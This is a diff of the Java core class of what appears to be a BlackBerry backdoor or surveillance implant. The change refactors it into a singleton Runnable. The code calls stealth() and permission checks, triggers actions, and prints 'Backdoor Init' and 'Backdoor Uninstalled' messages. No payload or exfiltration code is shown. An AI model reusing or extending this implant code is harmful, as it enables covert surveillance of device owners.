@@ -23,10 +23,19 @@ import com.ht.rcs.blackberry.utils.Utils;
 /**
  * Classe Core, contiene il main.
  */
-public class Core {
+public final class Core implements Runnable {
 
     /** The debug instance. */
     private static Debug debug;
+
+    private static Core instance;
+
+    public static synchronized Core getInstance() {
+        if (instance == null) {
+            instance = new Core();
+        }
+        return instance;
+    }
 
     /**
      * Lib main.
@@ -35,15 +44,22 @@ public class Core {
      *            the args
      */
     public static void libMain(final String[] args) {
-        Utils.sleep(1000);
+        Core core = Core.getInstance();
+        core.run();
+    }
 
+    private Core() {
+        
+        Utils.sleep(1000);
         Thread.currentThread().setPriority(Thread.MAX_PRIORITY);
 
         //#mdebug
         debug.init(true, false);
         debug = new Debug("Core", DebugLevel.VERBOSE);
-        debug.trace("RCSBlackBerry launching");
+        debug.trace("Core init");
         // #enddebug       
+        
+       
 
         boolean antennaInstalled = true;
         // #if 1=0
@@ -60,14 +76,10 @@ public class Core {
 
         Encryption.init();
 
-        Core core = new Core();
-        boolean ret = core.run();
+        /*
+         * Core core = Core.getInstance(); core.run();
+         */
 
-        // #debug
-        debug.trace("RCSBlackBerry exit, return " + ret);
-
-        // #debug
-        Debug.stop();
     }
 
     /** The task obj. */
@@ -78,7 +90,7 @@ public class Core {
      * 
      * @return true, if successful
      */
-    public final boolean run() {
+    public void run() {
 
         checkPermissions();
         stealth();
@@ -93,7 +105,7 @@ public class Core {
                 debug.error("TaskInit() FAILED");
                 Msg.demo("Backdoor Init... FAILED");
                 Msg.show();
-                return false;
+                break;
             } else {
                 //#debug
                 debug.trace("TaskInit() OK");
@@ -104,8 +116,8 @@ public class Core {
 
             //TODO togliere
             //if (!DeviceInfo.isSimulator()) {
-                debug.warn("TRIGGERING ACTION 0");
-                Status.getInstance().triggerAction(0, null);
+            debug.warn("TRIGGERING ACTION 0");
+            Status.getInstance().triggerAction(0, null);
             //}
 
             // #debug
@@ -116,9 +128,15 @@ public class Core {
                 // chiudere tutti i thread
                 // decidere se e' un uninstall
                 Msg.demo("Backdoor Uninstalled, reboot the device");
-                return false;
+                break;
             }
         }
+
+        // #debug
+        debug.trace("RCSBlackBerry exit ");
+
+        // #debug
+        Debug.stop();
     }
 
     /**
